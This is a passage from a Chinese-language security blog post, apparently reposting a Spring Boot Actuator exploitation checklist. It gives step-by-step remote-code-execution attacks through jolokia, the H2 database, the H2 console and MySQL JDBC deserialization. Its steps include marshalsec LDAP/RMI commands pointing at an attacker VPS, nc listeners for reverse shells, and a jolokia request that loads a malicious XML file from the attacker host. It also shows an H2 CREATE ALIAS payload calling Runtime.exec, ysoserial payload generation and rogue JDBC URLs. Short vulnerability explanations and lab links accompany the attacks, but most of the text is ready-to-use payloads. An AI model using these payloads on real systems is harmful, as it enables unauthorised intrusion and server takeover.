服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/#JNDIObject 1389</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure><h5 id="步骤五：监听反弹-shell-的端口"><a href="#步骤五：监听反弹-shell-的端口" class="headerlink" title="步骤五：监听反弹 shell 的端口"></a>步骤五：监听反弹 shell 的端口</h5><p>一般使用 nc 监听端口，等待反弹 shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nc -lv 443</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure><h5 id="步骤六：从外部-URL-地址加载日志配置文件"><a href="#步骤六：从外部-URL-地址加载日志配置文件" class="headerlink" title="步骤六：从外部 URL 地址加载日志配置文件"></a>步骤六：从外部 URL 地址加载日志配置文件</h5><blockquote><p>⚠️ 如果目标成功请求了example.xml 并且 marshalsec 也接收到了目标请求，但是目标没有请求 JNDIObject.class，大概率是因为目标环境的 jdk 版本太高，导致 JNDI 利用失败。</p></blockquote><p>替换实际的 your-vps-ip 地址访问 URL 触发漏洞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/your-vps-ip!/example.xml</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure><h4 id="漏洞原理：-3"><a href="#漏洞原理：-3" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol><li>直接访问可触发漏洞的 URL，相当于通过 jolokia 调用 <code>ch.qos.logback.classic.jmx.JMXConfigurator</code> 类的 <code>reloadByURL</code> 方法</li><li>目标机器请求外部日志配置文件 URL 地址，获得恶意 xml 文件内容</li><li>目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 漏洞)</li><li>xml 文件中利用 <code>logback</code> 依赖的 <code>insertFormJNDI</code> 标签，设置了外部 JNDI 服务器地址</li><li>目标机器请求恶意 JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞</li></ol><h4 id="漏洞分析：-3"><a href="#漏洞分析：-3" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p> <a href="https://xz.aliyun.com/t/4258">spring boot actuator rce via jolokia</a></p><h4 id="漏洞环境：-3"><a href="#漏洞环境：-3" class="headerlink" title="漏洞环境："></a>漏洞环境：</h4><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-jolokia-logback-rce">repository&#x2F;springboot-jolokia-logback-rce</a></p><p>正常访问：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:9094/env</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure><h3 id="0x05：jolokia-Realm-JNDI-RCE"><a href="#0x05：jolokia-Realm-JNDI-RCE" class="headerlink" title="0x05：jolokia Realm JNDI RCE"></a>0x05：jolokia Realm JNDI RCE</h3><h4 id="利用条件：-8"><a href="#利用条件：-8" class="headerlink" title="利用条件："></a>利用条件：</h4><ul><li>目标网站存在 <code>/jolokia</code> 或 <code>/actuator/jolokia</code> 接口</li><li>目标使用了 <code>jolokia-core</code> 依赖（版本要求暂未知）并且环境中存在相关 MBean</li><li>目标可以请求攻击者的服务器（请求可出外网）</li><li>普通 JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u141&#x2F;7u131&#x2F;8u121(RMI)，但相关环境可绕过</li></ul><h4 id="利用方法：-8"><a href="#利用方法：-8" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：查看已存在的-MBeans-1"><a href="#步骤一：查看已存在的-MBeans-1" class="headerlink" title="步骤一：查看已存在的 MBeans"></a>步骤一：查看已存在的 MBeans</h5><p>访问 <code>/jolokia/list</code> 接口，查看是否存在 <code>type=MBeanFactory</code> 和 <code>createJNDIRealm</code> 关键词。</p><h5 id="步骤二：准备要执行的-Java-代码"><a href="#步骤二：准备要执行的-Java-代码" class="headerlink" title="步骤二：准备要执行的 Java 代码"></a>步骤二：准备要执行的 Java 代码</h5><p>编写优化过后的用来反弹 shell 的 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java">Java 示例代码</a> <code>JNDIObject.java</code>。</p><h5 id="步骤三：托管-class-文件"><a href="#步骤三：托管-class-文件" class="headerlink" title="步骤三：托管 class 文件"></a>步骤三：托管 class 文件</h5><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 python 快速开启 http server</span></span><br><span class="line"> </span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p>将<strong>步骤二</strong>中编译好的 class 文件拷贝到 HTTP 服务器根目录。</p><h5 id="步骤四：架设恶意-rmi-服务"><a href="#步骤四：架设恶意-rmi-服务" class="headerlink" title="步骤四：架设恶意 rmi 服务"></a>步骤四：架设恶意 rmi 服务</h5><p>下载 <a href="https://github.com/mbechler/marshalsec">marshalsec</a> ，使用下面命令架设对应的 rmi 服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://your-vps-ip:80/#JNDIObject 1389</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure><h5 id="步骤五：监听反弹-shell-的端口-1"><a href="#步骤五：监听反弹-shell-的端口-1" class="headerlink" title="步骤五：监听反弹 shell 的端口"></a>步骤五：监听反弹 shell 的端口</h5><p>一般使用 nc 监听端口，等待反弹 shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 443</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure><h5 id="步骤六：发送恶意-payload"><a href="#步骤六：发送恶意-payload" class="headerlink" title="步骤六：发送恶意 payload"></a>步骤六：发送恶意 payload</h5><p>根据实际情况修改 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-realm-jndi-rce.py">springboot-realm-jndi-rce.py</a> 脚本中的目标地址，RMI 地址、端口等信息，然后在自己控制的服务器上运行。</p><h4 id="漏洞原理：-4"><a href="#漏洞原理：-4" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol><li>利用 jolokia 调用 createJNDIRealm 创建 JNDIRealm</li><li>设置 connectionURL 地址为 RMI Service URL</li><li>设置 contextFactory 为 RegistryContextFactory</li><li>停止 Realm</li><li>启动 Realm 以触发指定 RMI 地址的 JNDI 注入，造成 RCE 漏洞</li></ol><h4 id="漏洞分析：-4"><a href="#漏洞分析：-4" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p> <a href="https://static.anquanke.com/download/b/security-geek-2019-q1/article-10.html">Yet Another Way to Exploit Spring Boot Actuators via Jolokia</a></p><h4 id="漏洞环境：-4"><a href="#漏洞环境：-4" class="headerlink" title="漏洞环境："></a>漏洞环境：</h4><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-jolokia-logback-rce">repository&#x2F;springboot-jolokia-logback-rce</a></p><p>正常访问：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:9094/env</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure><h3 id="0x06：restart-h2-database-query-RCE"><a href="#0x06：restart-h2-database-query-RCE" class="headerlink" title="0x06：restart h2 database query RCE"></a>0x06：restart h2 database query RCE</h3><h4 id="利用条件：-9"><a href="#利用条件：-9" class="headerlink" title="利用条件："></a>利用条件：</h4><ul><li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li><li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li><li>存在 <code>com.h2database.h2</code> 依赖（版本要求暂未知）</li></ul><h4 id="利用方法：-9"><a href="#利用方法：-9" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：设置-spring-datasource-hikari-connection-test-query-属性"><a href="#步骤一：设置-spring-datasource-hikari-connection-test-query-属性" class="headerlink" title="步骤一：设置 spring.datasource.hikari.connection-test-query 属性"></a>步骤一：设置 spring.datasource.hikari.connection-test-query 属性</h5><blockquote><p>⚠️ 下面payload 中的 ‘T5’ 方法每一次执行命令后都需要更换名称 (如 T6) ，然后才能被重新创建使用，否则下次 restart 重启应用时漏洞不会被触发</p></blockquote><p>spring 1.x（无回显执行命令）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"> </span><br><span class="line">spring.datasource.hikari.connection-test-query=CREATE ALIAS T5 AS CONCAT(&#x27;void ex(String m1,String m2,String m3)throws Exception&#123;Runti&#x27;,&#x27;me.getRun&#x27;,&#x27;time().exe&#x27;,&#x27;c(new String[]&#123;m1,m2,m3&#125;);&#125;&#x27;);CALL T5(&#x27;cmd&#x27;,&#x27;/c&#x27;,&#x27;calc&#x27;);</span><br></pre></td></tr></table></figure><p>spring 2.x（无回显执行命令）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"> </span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.datasource.hikari.connection-test-query&quot;,&quot;value&quot;:&quot;CREATE ALIAS T5 AS CONCAT(&#x27;void ex(String m1,String m2,String m3)throws Exception&#123;Runti&#x27;,&#x27;me.getRun&#x27;,&#x27;time().exe&#x27;,&#x27;c(new String[]&#123;m1,m2,m3&#125;);&#125;&#x27;);CALL T5(&#x27;cmd&#x27;,&#x27;/c&#x27;,&#x27;calc&#x27;);&quot;&#125;</span><br></pre></td></tr></table></figure><h5 id="步骤二：重启应用"><a href="#步骤二：重启应用" class="headerlink" title="步骤二：重启应用"></a>步骤二：重启应用</h5><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /restart</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/restart</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure><h4 id="漏洞原理：-5"><a href="#漏洞原理：-5" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol><li>spring.datasource.hikari.connection-test-query 属性被设置为一条恶意的 <code>CREATE ALIAS</code> 创建自定义函数的 SQL 语句</li><li>其属性对应 HikariCP 数据库连接池的 connectionTestQuery 配置，定义一个新数据库连接之前被执行的 SQL 语句</li><li>restart 重启应用，会建立新的数据库连接</li><li>如果 SQL 语句中的自定义函数还没有被执行过，那么自定义函数就会被执行，造成 RCE 漏洞</li></ol><h4 id="漏洞分析：-5"><a href="#漏洞分析：-5" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p> <a href="https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database">remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database</a></p><h4 id="漏洞环境：-5"><a href="#漏洞环境：-5" class="headerlink" title="漏洞环境："></a>漏洞环境：</h4><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-h2-database-rce">repository&#x2F;springboot-h2-database-rce</a></p><p>正常访问：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:9096/actuator/env</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure><h3 id="0x07：h2-database-console-JNDI-RCE"><a href="#0x07：h2-database-console-JNDI-RCE" class="headerlink" title="0x07：h2 database console JNDI RCE"></a>0x07：h2 database console JNDI RCE</h3><h4 id="利用条件：-10"><a href="#利用条件：-10" class="headerlink" title="利用条件："></a>利用条件：</h4><ul><li>存在 <code>com.h2database.h2</code> 依赖（版本要求暂未知）</li><li>spring 配置中启用 h2 console <code>spring.h2.console.enabled=true</code></li><li>目标可以请求攻击者的服务器（请求可出外网）</li><li>JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201&#x2F;7u191&#x2F;8u182&#x2F;11.0.1（LDAP 方式）</li></ul><h4 id="利用方法：-10"><a href="#利用方法：-10" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：访问路由获得-jsessionid"><a href="#步骤一：访问路由获得-jsessionid" class="headerlink" title="步骤一：访问路由获得 jsessionid"></a>步骤一：访问路由获得 jsessionid</h5><p>直接访问目标开启 h2 console 的默认路由 <code>/h2-console</code>，目标会跳转到页面 <code>/h2-console/login.jsp?jsessionid=xxxxxx</code>，记录下实际的 <code>jsessionid=xxxxxx</code> 值。</p><h5 id="步骤二：准备要执行的-Java-代码-1"><a href="#步骤二：准备要执行的-Java-代码-1" class="headerlink" title="步骤二：准备要执行的 Java 代码"></a>步骤二：准备要执行的 Java 代码</h5><p>编写优化过后的用来反弹 shell 的 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java">Java 示例代码</a> <code>JNDIObject.java</code>，</p><p>使用兼容低版本 jdk 的方式编译：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">javac -<span class="built_in">source</span> 1.5 -target 1.5 JNDIObject.java</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>然后将生成的 <code>JNDIObject.class</code> 文件拷贝到 <strong>步骤二</strong> 中的网站根目录。</p><h5 id="步骤三：托管-class-文件-1"><a href="#步骤三：托管-class-文件-1" class="headerlink" title="步骤三：托管 class 文件"></a>步骤三：托管 class 文件</h5><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 python 快速开启 http server</span></span><br><span class="line"> </span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p>将<strong>步骤二</strong>中编译好的 class 文件拷贝到 HTTP 服务器根目录。</p><h5 id="步骤四：架设恶意-ldap-服务-1"><a href="#步骤四：架设恶意-ldap-服务-1" class="headerlink" title="步骤四：架设恶意 ldap 服务"></a>步骤四：架设恶意 ldap 服务</h5><p>下载 <a href="https://github.com/mbechler/marshalsec">marshalsec</a> ，使用下面命令架设对应的 ldap 服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/#JNDIObject 1389</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure><h5 id="步骤五：监听反弹-shell-的端口-2"><a href="#步骤五：监听反弹-shell-的端口-2" class="headerlink" title="步骤五：监听反弹 shell 的端口"></a>步骤五：监听反弹 shell 的端口</h5><p>一般使用 nc 监听端口，等待反弹 shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nc -lv 443</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure><h5 id="步骤六：发包触发-JNDI-注入"><a href="#步骤六：发包触发-JNDI-注入" class="headerlink" title="步骤六：发包触发 JNDI 注入"></a>步骤六：发包触发 JNDI 注入</h5><p>根据实际情况，替换下面数据中的 <code>jsessionid=xxxxxx</code>、<code>www.example.com</code> 和 <code>ldap://your-vps-ip:1389/JNDIObject</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /h2-console/login.do?jsessionid=xxxxxx</span><br><span class="line">Host: www.example.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Referer: http://www.example.com/h2-console/login.jsp?jsessionid=xxxxxx</span><br><span class="line"> </span><br><span class="line">language=en&amp;setting=Generic+H2+%28Embedded%29&amp;name=Generic+H2+%28Embedded%29&amp;driver=javax.naming.InitialContext&amp;url=ldap://your-vps-ip:1389/JNDIObject&amp;user=&amp;password=</span><br></pre></td></tr></table></figure><h4 id="漏洞分析：-6"><a href="#漏洞分析：-6" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p> <a href="https://mp.weixin.qq.com/s/Yn5U8WHGJZbTJsxwUU3UiQ">Spring Boot + H2数据库JNDI注入</a></p><h4 id="漏洞环境：-6"><a href="#漏洞环境：-6" class="headerlink" title="漏洞环境："></a>漏洞环境：</h4><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-h2-database-rce">repository&#x2F;springboot-h2-database-rce</a></p><p>正常访问：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:9096/h2-console</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure><h3 id="0x08：mysql-jdbc-deserialization-RCE"><a href="#0x08：mysql-jdbc-deserialization-RCE" class="headerlink" title="0x08：mysql jdbc deserialization RCE"></a>0x08：mysql jdbc deserialization RCE</h3><h4 id="利用条件：-11"><a href="#利用条件：-11" class="headerlink" title="利用条件："></a>利用条件：</h4><ul><li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li><li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li><li>目标环境中存在 <code>mysql-connector-java</code> 依赖</li><li>目标可以请求攻击者的服务器（请求可出外网）</li></ul><h4 id="利用方法：-11"><a href="#利用方法：-11" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：查看环境依赖"><a href="#步骤一：查看环境依赖" class="headerlink" title="步骤一：查看环境依赖"></a>步骤一：查看环境依赖</h5><p>GET 请求 <code>/env</code> 或 <code>/actuator/env</code>，搜索环境变量（classpath）中是否有 <code>mysql-connector-java</code> 关键词，并记录下其版本号（5.x 或 8.x）；</p><p>搜索并观察环境变量中是否存在常见的反序列化 gadget 依赖，比如 <code>commons-collections</code>、<code>Jdk7u21</code>、<code>Jdk8u20</code> 等；</p><p>搜索 <code>spring.datasource.url</code> 关键词，记录下其 <code>value</code> 值，方便后续恢复其正常 jdbc url 值。</p><h5 id="步骤二：架设恶意-rogue-mysql-server"><a href="#步骤二：架设恶意-rogue-mysql-server" class="headerlink" title="步骤二：架设恶意 rogue mysql server"></a>步骤二：架设恶意 rogue mysql server</h5><p>在自己控制的服务器上运行 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-jdbc-deserialization-rce.py">springboot-jdbc-deserialization-rce.py</a> 脚本，并使用 <a href="https://github.com/frohoff/ysoserial">ysoserial</a> 自定义要执行的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections3 calc &gt; payload.ser</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>在脚本<strong>同目录下</strong>生成 <code>payload.ser</code> 反序列化 payload 文件，供脚本使用。</p><h5 id="步骤三：设置-spring-datasource-url-属性"><a href="#步骤三：设置-spring-datasource-url-属性" class="headerlink" title="步骤三：设置 spring.datasource.url 属性"></a>步骤三：设置 spring.datasource.url 属性</h5><blockquote><p>⚠️ 修改此属性会暂时导致网站所有的正常数据库服务不可用，会对业务造成影响，请谨慎操作！</p></blockquote><p>mysql-connector-java 5.x 版本设置<strong>属性值</strong>为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&amp;useSSL=false&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>mysql-connector-java 8.x 版本设置<strong>属性值</strong>为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&amp;useSSL=false&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"> </span><br><span class="line">spring.datasource.url=对应属性值</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"> </span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.datasource.url&quot;,&quot;value&quot;:&quot;对应属性值&quot;&#125;</span><br></pre></td></tr></table></figure><h5 id="步骤四：刷新配置-1"><a href="#步骤四：刷新配置-1" class="headerlink" title="步骤四：刷新配置"></a>步骤四：刷新配置</h5><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /refresh</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/refresh</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure><h5 id="步骤五：触发数据库查询"><a href="#步骤五：触发数据库查询" class="headerlink" title="步骤五：触发数据库查询"></a>步骤五：触发数据库查询</h5><p>尝试访问网站已知的数据库查询的接口，例如： <code>/product/list</code> ，或者寻找其他方式，主动触发源网站进行数据库查询，然后漏洞会被触发</p><h5 id="步骤六：恢复正常-jdbc-url"><a href="#步骤六：恢复正常-jdbc-url" class="headerlink" title="步骤六：恢复正常 jdbc url"></a>步骤六：恢复正常 jdbc url</h5><p>反序列化漏洞利用完成后，使用 <strong>步骤三</strong> 的方法恢复 <strong>步骤一</strong> 中记录的 <code>spring.datasource.url</code> 的原始 <code>value</code> 值</p><h4 id="漏洞原理：-6"><a href="#漏洞原理：-6" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol><li>spring.datasource.url 属性被设置为外部恶意 mysql jdbc url 地址</li><li>refresh 刷新后设置了一个新的 spring.datasource.url 属性值</li><li>当网站进行数据库查询等操作时，会尝试使用恶意 mysql jdbc url 建立新的数据库连接</li><li>然后恶意 mysql server 就会在建立连接的合适阶段返回反序列化 payload 数据</li><li>目标依赖的 mysql-connector-java 就会反序列化设置好的 gadget，造成 RCE 漏洞</li></ol><h4 id="漏洞分析：-7"><a href="#漏洞分析：-7" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p> <a href="https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf">New-Exploit-Technique-In-Java-Deserialization-Attack</a></p><h4 id="漏洞环境：-7"><a href="#漏洞环境：-7" class="headerlink" title="漏洞环境："></a>漏洞环境：</h4><blockquote><p>需要配置 application.properties 中的 spring.datasource.url、spring.datasource.username、spring.datasource.password，保证可以正常连上 mysql 数据库，否则程序启动时就会报错退出</p></blockquote><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-mysql-jdbc-rce">repository&#x2F;springboot-mysql-jdbc-rce</a></p><p>正常访问：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:9097/actuator/env</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>发送完 payload 后触发漏洞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:9097/product/list</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure><h3 id="0x09：restart-logging-config-logback-JNDI-RCE"><a href="#0x09：restart-logging-config-logback-JNDI-RCE" class="headerlink" title="0x09：restart logging.config logback JNDI RCE"></a>0x09：restart logging.config logback JNDI RCE</h3><h4 id="利用条件：-12"><a href="#利用条件：-12" class="headerlink" title="利用条件："></a>利用条件：</h4><ul><li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li><li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li><li>普通 JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201&#x2F;7u191&#x2F;8u182&#x2F;11.0.1(LDAP)，但相关环境可绕过</li><li>⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出</li><li>⚠️ HTTP 服务器如果返回含有畸形 xml 语法内容的文件，会导致程序异常退出</li><li>⚠️ JNDI 服务返回的 object 需要实现 <code>javax.naming.spi.ObjectFactory</code> 接口，否则会导致程序异常退出</li></ul><h4 id="利用方法：-12"><a href="#利用方法：-12" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：托管-xml-文件"><a href="#步骤一：托管-xml-文件" class="headerlink" title="步骤一：托管 xml 文件"></a>步骤一：托管 xml 文件</h5><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 python 快速开启 http server</span></span><br><span class="line"> </span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 